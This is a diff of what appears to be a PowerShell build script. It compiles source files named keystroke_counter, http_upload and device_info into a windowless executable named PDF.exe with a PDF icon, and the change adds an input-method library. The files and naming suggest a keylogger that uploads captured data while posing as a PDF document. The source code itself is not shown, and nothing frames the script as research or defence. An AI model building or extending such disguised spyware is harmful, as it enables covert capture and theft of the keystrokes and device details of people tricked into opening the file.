@@ -31,7 +31,7 @@ try {
         '-fno-unwind-tables' '-fno-asynchronous-unwind-tables' '-nostdlib' `
         'main.cpp' 'keystroke_counter.cpp' 'http_upload.cpp' 'device_info.cpp' '..\build\PDF.res' '-o' '..\dist\PDF.exe' `
         '-Wl,--subsystem,windows:6.02,--entry,EntryPoint,--dynamicbase,--nxcompat,--high-entropy-va,--no-insert-timestamp,--strip-all' `
-        '-lkernel32' '-ladvapi32' '-luser32' '-lshell32' '-lole32' '-lwinhttp'
+        '-lkernel32' '-ladvapi32' '-luser32' '-lshell32' '-lole32' '-lwinhttp' '-limm32'
     if ($LASTEXITCODE -ne 0) { throw 'C++ compilation failed' }
 } finally { Pop-Location }
 Copy-Item -LiteralPath "$PSScriptRoot\assets\PDF.ico" -Destination "$PSScriptRoot\dist\PDF.ico" -Force
